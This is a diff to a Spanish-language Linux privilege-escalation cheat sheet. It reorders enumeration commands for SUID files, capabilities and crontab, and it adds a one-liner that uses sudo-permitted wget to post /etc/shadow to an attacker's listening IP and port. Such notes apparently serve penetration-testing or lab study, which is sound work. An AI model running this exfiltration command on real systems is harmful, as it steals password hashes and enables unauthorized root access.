@@ -10,6 +10,18 @@
 	
 	find / -perm -4000 2>/dev/null
 ```
+### Capabilities
+
+```python
+	getcap -r / 2>/dev/null
+```
+### Tareas programadas
+
+```python
+	cat /etc/crontab
+```
+
+### Escaladas 
 ### Escalada de privilegios con cat
 
 ```python
@@ -25,13 +37,6 @@
 ```
 ### Escalada de privilegios con wget
 
-### Capabilities
-
 ```python
-	getcap -r / 2>/dev/null
-```
-### Tareas programadas
-
-```python
-	cat /etc/crontab
+sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> <puerto>
 ```
